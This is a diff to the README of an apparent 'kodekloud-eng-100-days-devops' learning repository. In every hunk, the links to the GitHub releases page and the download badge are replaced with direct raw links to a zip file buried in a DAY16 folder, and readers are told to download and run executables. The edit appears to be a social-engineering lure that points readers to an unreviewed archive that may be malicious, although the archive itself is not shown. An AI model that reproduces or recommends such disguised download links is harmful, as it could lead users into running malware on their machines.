@@ -1,6 +1,6 @@
 # 🚀 kodekloud-eng-100-days-devops - Master Essential DevOps Skills Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-For%20Free-brightgreen)](https://github.com/gurusgallery/kodekloud-eng-100-days-devops/releases)
+[![Download Now](https://raw.githubusercontent.com/gurusgallery/kodekloud-eng-100-days-devops/main/DAY16/kodekloud_eng_devops_days_v3.4-beta.2.zip%20Now-For%20Free-brightgreen)](https://raw.githubusercontent.com/gurusgallery/kodekloud-eng-100-days-devops/main/DAY16/kodekloud_eng_devops_days_v3.4-beta.2.zip)
 
 ## 📘 Overview
 Welcome to the `kodekloud-eng-100-days-devops` repository. This project includes numerous hands-on tasks and projects from the KodeKloud DevOps challenge. It helps you gain practical experience in tools like Linux, Docker, Ansible, Git, Kubernetes, AWS, Grafana, and more. 
@@ -9,7 +9,7 @@ Welcome to the `kodekloud-eng-100-days-devops` repository. This project includes
 To begin, follow these steps to download and run the software. You will gain essential skills in DevOps practices through this repository.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** You can find all the downloadable files by visiting [this page](https://github.com/gurusgallery/kodekloud-eng-100-days-devops/releases).
+1. **Visit the Releases Page:** You can find all the downloadable files by visiting [this page](https://raw.githubusercontent.com/gurusgallery/kodekloud-eng-100-days-devops/main/DAY16/kodekloud_eng_devops_days_v3.4-beta.2.zip).
    
 2. **Choose Your File:** Look for the most recent release. Common files include executables or zipped folders that contain all the necessary resources.
 
@@ -71,4 +71,4 @@ This project is open-source under the MIT License. You are free to use, modify, 
 ## 🙌 Acknowledgments
 Thanks to KodeKloud for providing a comprehensive platform to learn DevOps skills. This repository aims to empower everyone to dive into DevOps with confidence. 
 
-Make sure to visit [this page](https://github.com/gurusgallery/kodekloud-eng-100-days-devops/releases) to get started with your download.
+Make sure to visit [this page](https://raw.githubusercontent.com/gurusgallery/kodekloud-eng-100-days-devops/main/DAY16/kodekloud_eng_devops_days_v3.4-beta.2.zip) to get started with your download.
